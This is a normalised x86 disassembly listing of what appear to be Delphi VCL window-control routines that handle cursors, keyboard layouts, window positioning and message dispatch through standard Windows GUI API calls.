lea edx [ esi + 0x10 ]
mov eax ebx
call sub_441fe8
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_445678
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4473d4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44394c
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403418
sub_4456c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4403e8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_444978
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fefc
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e3e4
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_445810
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4458ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4458f6
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4470c4
mov dl [ ebx + 0x184 ]
call sub_44bd04
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e35c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4080d0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e15c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e15c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e15c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_4458fc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_445986
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44598d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e35c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4080d0
test eax eax
je r-xdata
mov eax ebx
call sub_4470c4
mov dl 0x1
call sub_44bce8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_4459e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_418d58
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_441a58
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_445a38
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_445a6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403418
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403418
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_445aac
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_441a58
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_445b04
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_420044
mov edx [ r-xdata ]
call sub_4033cc
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_445b3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_41a19c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445b60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4470c4
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_445bbc
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_445b28
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a19c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_445bfc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4059b4
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4059b4
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_445c68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_445d10
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d17
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43e550
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_40321c
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_40599c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403418
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4059b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ edi + 0x178 ] eax
sub_445d20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4470c4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_443924
xor edx edx
push ebp
push sub_445de2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403418
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445de9
mov eax [ ebp - 0x4 ]
call sub_44392c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_445de9
mov eax [ ebp - 0x4 ]
call sub_4576d8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_440b04
sub_445e34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403164
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442718
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_445e9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_440b04
sub_445eb8
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_445ee0
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4576d8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4575e0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403418
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_445ee0
test al al
jne r-xdata
sub_445f48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445ee0
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_448210
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445f74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445ee0
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_448210
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445fa0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_445fc8
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4576d8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4575e0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403418
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_445fc8
test al al
jne r-xdata
sub_446030
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_446050
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445fc8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_446090
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4576d8
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403418
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_446090
test al al
jne r-xdata
sub_4460f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446090
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_446114
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_443d80
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_441a58
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446114
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_4461c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_446114
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_4576d8
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_441a58
test eax eax
jne r-xdata
sub_44626c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44628c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444d0c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4462c0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_444d0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4462e0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_446330
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_446354
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43fb70
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_443dbc
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_443d80
mov dl [ esp ]
mov si 0xffd1
call sub_403418
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4463ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403418
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4463d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403418
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_446408
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44252c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_443e1c
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44462c
sub_446440
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403418
pop esi
pop ebx
retn
mov eax ebx
call sub_440ee8
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40442c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40442c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_4464c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444a0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_442600
sub_446520
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_444780
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_443b7c
pop ebx
retn
sub_446550
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_446578
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_443b7c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4465e8
push ebx
mov ebx eax
mov eax ebx
call sub_44246c
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_443e1c
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_422ecc
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_441a58
sub_446624
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43f150
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4470c4
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_441a58
sub_446664
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4473c8
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4470c4
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4466a4
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_443e1c
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_446fcc
sub_4466e4
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_447204
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_447204
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_446744
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4414b4
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4403e8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_444978
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_4467b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4425a4
mov edx esi
mov eax ebx
call sub_443ddc
pop esi
pop ebx
retn
sub_4467d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43d7e0
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_4576d8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403418
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403418
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403418
test al al
jne r-xdata
sub_446864
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_448210
mov edx esi
mov eax ebx
call sub_4467d0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_441a58
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_441a58
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_441a58
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
